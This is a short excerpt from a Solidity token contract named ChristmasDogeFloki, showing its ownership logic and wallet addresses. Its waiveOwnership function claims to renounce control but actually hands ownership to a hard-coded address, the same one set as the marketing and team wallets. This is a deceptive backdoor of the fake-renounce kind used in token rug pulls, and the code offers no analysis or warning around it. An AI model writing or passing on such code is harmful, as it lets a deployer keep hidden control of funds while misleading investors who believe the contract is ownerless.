...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x73a0b0491b161F8E03D0252392201f3183634FBb));
        _owner = address(0x73a0b0491b161F8E03D0252392201f3183634FBb);
    }
...
contract ChristmasDogeFloki is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Christmas DogeF loki";
    string private _symbol = "ChristmasDogeFloki";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x73a0b0491b161F8E03D0252392201f3183634FBb);
    address payable public teamWalletAddress = payable(0x73a0b0491b161F8E03D0252392201f3183634FBb);
